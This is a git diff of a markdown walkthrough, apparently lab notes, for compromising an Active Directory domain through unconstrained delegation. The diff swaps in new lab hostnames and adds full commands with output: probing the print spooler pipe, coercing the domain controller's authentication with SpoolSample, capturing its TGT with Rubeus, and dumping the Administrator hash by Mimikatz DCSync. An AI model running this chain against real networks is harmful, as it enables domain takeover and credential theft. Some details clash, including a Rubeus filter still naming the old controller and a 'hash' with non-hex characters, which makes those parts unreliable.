@@ -10,7 +10,13 @@ This attack exploits **Unconstrained Delegation** in an Active Directory environ
 ### 1️⃣ **Checking if Print Spooler is Enabled on the DC**
 Use PowerShell to check if the print spooler service is running on a **Domain Controller (DC)**:
 ```powershell
-PS C:\Tools> dir \\CDC01\pipe\spoolss
+PS C:\Users\Administrator> ls \\dc03.infinity.com\pipe\spoolss
+
+Directory: \\dc03.infinity.com\pipe
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+                                                 spoolss
 ```
 If the output shows the `spoolss` named pipe, it confirms that the print spooler service is accessible.
 
@@ -21,11 +27,11 @@ The **MS-RPRN (Microsoft Print System Remote Protocol)** allows us to **coerce**
 
 Run **SpoolSample.exe**:
 ```sh
-C:\Tools> SpoolSample.exe CDC01 APPSRV01
+C:\Tools> .\SpoolSample.exe dc03.infinity.com web05.infinity.com
 [+] Converted DLL to shellcode
 [+] Executing RDI
 [+] Calling exported function
-TargetServer: \\CDC01, CaptureServer: \\APPSRV01
+TargetServer: \\dc03.infinity.com, CaptureServer: \\web05.infinity.com
 Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
 ```
 > ⚠️ **Note:** You may need to run SpoolSample multiple times before it successfully triggers authentication.
@@ -35,7 +41,7 @@ Attempted printer notification and received an invalid handle. The coerced authe
 ### 3️⃣ **Monitoring for TGT Capture Using Rubeus**
 We use **Rubeus** in monitoring mode to capture the **TGT** from the DC:
 ```cmd
-C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
+C:\Tools> Rubeus.exe monitor /interval:1 /filteruser:CDC01$ /nowrap
 ```
 ✅ If successful, **Rubeus** will display the captured **TGT** for the **Domain Controller (CDC01$)**:
 ```
@@ -79,13 +85,28 @@ C:\Tools> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
 ### 5️⃣ **Performing DCSync to Extract Domain Credentials**
 With the **TGT of the DC**, we can use **Mimikatz** to **extract all password hashes from Active Directory**:
 ```cmd
-mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+c:\Temp>.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:infinity.com /user:administrator /csv" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::dcsync /domain:infinity.com /user:administrator /csv
+[DC] 'infinity.com' will be the domain
+[DC] 'dc03.infinity.com' will be the DC server
+[DC] 'administrator' will be the user account
+500     Administrator   346563ca3b673adfff2828f368cads40        66048
+
+mimikatz(commandline) # exit
 ```
-Sample output:
-```
-Hash NTLM: 4b6af2bf64714682eeef64f516a08949
-```
-✅ Now we have the **NTLM hash of the KRBTGT account**, meaning we can generate **Golden Tickets** and take full control of the domain.
+
+✅ Now we have the **NTLM hash of the Administrator (Domain Admin) account.
 
 ---
 
@@ -113,9 +134,5 @@ This attack shows how dangerous **Unconstrained Delegation** is. If an attacker 
 
 ---
 
-## 🛠 **Tools Used**
-- **SpoolSample**: Exploits **MS-RPRN** to force authentication from a DC.
-- **Rubeus**: Captures and injects **TGTs** in memory.
-- **Mimikatz**: Performs **DCSync** to dump **NTLM hashes**.
 
 
